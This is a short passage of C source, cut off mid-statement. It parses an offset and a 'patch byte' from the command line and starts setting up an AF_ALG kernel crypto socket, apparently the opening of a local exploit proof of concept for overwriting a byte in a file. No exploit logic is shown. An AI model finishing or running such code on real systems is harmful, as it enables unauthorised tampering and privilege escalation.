int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "Usage: %s <offset> <patch_byte>\n", argv[0]); return 1; }
    target_off = atol(argv[1]);
    unsigned char patch = (unsigned char)atoi(argv[2]);
    target_len = 1;

    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
